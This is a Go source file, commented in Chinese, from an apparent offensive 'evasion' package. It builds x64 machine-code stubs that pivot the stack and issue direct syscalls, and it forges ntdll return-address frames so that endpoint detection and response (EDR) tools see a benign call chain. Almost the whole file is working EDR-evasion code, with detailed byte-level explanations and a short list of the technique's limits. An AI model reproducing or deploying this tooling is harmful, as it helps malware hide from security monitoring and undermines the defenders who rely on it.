package evasion

// 调用栈伪造（stack spoofing）的机器码与栈帧生成。
//
// 背景：EDR 判定「这是不是一次正常的系统调用」时，除了看 syscall 指令所在页
// （RIP 是否落在 ntdll 之外），还会看**调用栈**：syscall 入口那一刻 RSP 指向的
// 返回地址链，是否来自合法模块的正常调用路径。direct syscall 的桩代码虽然躲开了
// ntdll 函数体上的 userland hook，但它是在 Go 的运行时栈上执行 syscall 的 ——
// 栈上写着 runtime.asmstdcall / syscall.SyscallN，任何做栈回溯的检测都会看到
// 「一条没有出现在任何正常 API 调用链里的 syscall」。
//
// 做法（栈枢轴 + 伪造帧链）：
//  1. 生成一段桩：保存真实 RSP → 把 RSP 切到我们预先布置好的伪栈 → 直接 syscall
//     → 切回真实 RSP → ret。syscall 指令执行期间 RSP 指向伪栈，因此内核/EDR
//     在入口抓到的栈是伪栈。
//  2. 伪栈按 x64 调用约定布置：偏移 0 是返回地址（指向 ntdll!BaseThreadInitThunk+0x14），
//     随后 4 个 shadow slot，再往上是第 5～8 个参数（NT 的栈传参就落在这里），
//     最后接一帧 ntdll!RtlUserThreadStart+0x21 与 NULL 终止。
//
// 局限（写在这里，避免后来者误以为它万能）：
//   - 只对 direct 模式生效。indirect 模式的收益来自「syscall 指令本身在 ntdll 内」，
//     它靠 `jmp` 进 ntdll 然后由 ntdll 的 `ret` 回到调用者，中途不经过我们的桩 ——
//     要枢轴就必须让返回落在伪栈上，反而把「返回地址在未背书内存」这个特征暴露出来。
//   - 伪栈只在 syscall 执行的那几个纳秒内有效；若此刻进程收到硬件异常/APC 需要
//     回到 Go 栈处理，栈与 goroutine 结构不匹配。窗口极小，但不能说为零。
//   - 栈回溯的**深度**仍然可疑：Go 程序的真实调用链里有 runtime 帧，改成 ntdll 帧
//     只是让浅层看起来正常；做全栈比对（比对返回地址与调用点指令）仍能发现不一致。

import "fmt"

const (
	// SpoofShadowSpace x64 调用约定的 shadow space（4 个 8 字节槽）
	SpoofShadowSpace = 32
	// SpoofArgOffset 第 5 个整型参数在栈上的偏移（相对 syscall 入口的 RSP）：
	// 返回地址 8 + shadow space 32 = 0x28
	SpoofArgOffset = 0x28
	// SpoofMaxStackArgs 栈上最多携带的参数个数（配合 SpoofArgOffset 覆盖到第 8 个参数，
	// 与 syscall.SyscallN 的寄存器+栈传参上限对齐）
	SpoofMaxStackArgs = 4
	// SpoofMaxArgs 单次可伪装的参数总数（4 寄存器 + 4 栈）
	SpoofMaxArgs = 4 + SpoofMaxStackArgs

	// SpoofBaseThreadInitThunkOffset ntdll!BaseThreadInitThunk 内合法返回点偏移
	SpoofBaseThreadInitThunkOffset = 0x14
	// SpoofRtlUserThreadStartOffset ntdll!RtlUserThreadStart 内合法返回点偏移
	SpoofRtlUserThreadStartOffset = 0x21

	// SpoofStubSize 栈枢轴桩机器码长度（字节），BuildSpoofStub 必须与之等长
	SpoofStubSize = 32
)

// BuildSpoofStub 生成「栈枢轴 + direct syscall」桩机器码。
//
// 机器码（32 字节）：
//
//	53                  push rbx            ; 保存 callee-saved 寄存器
//	48 8b dc            mov  rbx, rsp       ; 记住真实栈
//	48 a1 <slot:imm64>  mov  rax, [slot]    ; 伪栈顶（运行期写入的绝对地址）
//	48 89 c4            mov  rsp, rax       ; 枢轴
//	4c 8b d1            mov  r10, rcx       ; NT 调用约定：第 1 个参数放 r10
//	b8 <ssn:imm32>      mov  eax, ssn
//	0f 05               syscall
//	48 89 dc            mov  rsp, rbx       ; 恢复真实栈
//	5b                  pop  rbx
//	c3                  ret
//
// slotAddr 指向一块**可写**内存，存放伪栈顶地址；桩每次执行都从那里读，
// 因此同一个桩可以被不同伪栈复用（刷新 slot 即可，不必重建代码页）。
//
// 为什么用 `mov rax, [imm64]`（A1）而不是 RIP 相对的 `mov rax, [rip+disp32]`：
// 占位可执行页与数据页不一定在同一 2GB 内，绝对寻址对任何地址都成立，代价是 10 字节。
// 也不用 `mov rax, imm64` 直接把伪栈地址写进代码：那样每换一次伪栈就得重写代码页，
// 而代码页是 RX 的（W^X），改一次要来回翻两次保护属性。
func BuildSpoofStub(ssn uint32, slotAddr uintptr) []byte {
	code := make([]byte, 0, 32)
	code = append(code, 0x53)             // push rbx
	code = append(code, 0x48, 0x8B, 0xDC) // mov rbx, rsp
	code = append(code, 0x48, 0xA1)       // mov rax, [imm64]
	code = append(code, le64(slotAddr)...)
	code = append(code, 0x48, 0x89, 0xC4)   // mov rsp, rax
	code = append(code, NtdllStubPrefix...) // mov r10, rcx
	code = append(code, 0xB8)               // mov eax, imm32
	code = append(code, byte(ssn), byte(ssn>>8), byte(ssn>>16), byte(ssn>>24))
	code = append(code, 0x0F, 0x05)       // syscall
	code = append(code, 0x48, 0x89, 0xDC) // mov rsp, rbx
	code = append(code, 0x5B)             // pop rbx
	code = append(code, 0xC3)             // ret
	return code
}

// BuildSpoofFrame 构建伪栈帧（从枢轴点开始按低地址到高地址排列）。
//
//	offset 0x00         BaseThreadInitThunk+0x14   ← syscall 那一刻的「返回地址」
//	offset 0x08..0x27   shadow space（4 个槽，置 0）
//	offset 0x28 起      第 5..8 个参数（NT 的栈传参）
//	紧随其后            RtlUserThreadStart+0x21   ← 更深一帧，仍指向 ntdll
//	最后                0                          ← 链终止
//
// 返回值 frame 由调用方复制到 16 字节对齐的地址处；docs 里的「栈对齐」指整个
// frame 长度会被补齐到 16 的倍数，从而保证枢轴后 RSP 仍 16 字节对齐（内核与
// unwind 都假定如此）。
func BuildSpoofFrame(baseThreadInitThunk, rtlUserThreadStart uintptr, stackArgs []uintptr) ([]byte, error) {
	if baseThreadInitThunk == 0 || rtlUserThreadStart == 0 {
		return nil, fmt.Errorf("ntdll 合法返回点地址为 0")
	}
	if len(stackArgs) > SpoofMaxStackArgs {
		return nil, fmt.Errorf("栈传参过多（最多 4 个）")
	}
	size := SpoofArgOffset + 8*len(stackArgs) + 8 /* RtlUserThreadStart 帧 */ + 8 /* 终止 */
	if rem := size % 16; rem != 0 {
		size += 16 - rem // 16 字节对齐补齐
	}
	frame := make([]byte, size)
	put64(frame[0:8], baseThreadInitThunk)
	for i, a := range stackArgs {
		off := SpoofArgOffset + 8*i
		put64(frame[off:off+8], a)
	}
	chainOff := SpoofArgOffset + 8*len(stackArgs)
	put64(frame[chainOff:chainOff+8], rtlUserThreadStart)
	// chainOff+8 起全是 0：作为帧链终止（NULL 返回地址）
	return frame, nil
}

// le64 小端编码 64 位整数
func le64(v uintptr) []byte {
	b := make([]byte, 8)
	for i := 0; i < 8; i++ {
		b[i] = byte(uint64(v) >> (8 * uint(i)))
	}
	return b
}

// put64 把小端 8 字节写入 dst（dst 长度必须 ≥ 8）
func put64(dst []byte, v uintptr) {
	for i := 0; i < 8; i++ {
		dst[i] = byte(uint64(v) >> (8 * uint(i)))
	}
}
